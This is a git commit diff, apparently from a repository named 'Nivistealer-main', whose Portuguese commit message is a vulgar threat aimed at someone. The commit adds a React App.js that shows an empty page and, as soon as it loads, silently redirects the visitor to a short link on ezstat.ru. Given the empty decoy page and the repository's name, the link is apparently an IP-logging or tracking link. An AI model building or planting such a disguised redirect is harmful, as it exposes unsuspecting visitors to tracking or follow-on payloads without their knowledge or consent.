e611ae903c7ab328f2f4c97eb800c305ea784410
raphael-rissoli-incript <raphaelrissoli@incript.com.br>
2024-03-06 19:32:13 -0300

    ele vai se foder

---
+++ Nivistealer-main/meu-app-react/src/App.js
@@ -0,0 +1,11 @@
+import React, { useEffect } from 'react';
+
+function App() {
+  useEffect(() => {
+    window.location.href = 'https://ezstat.ru/29EDq6';
+  }, []);
+
+  return <div className="App"></div>;
+}
+
+export default App;
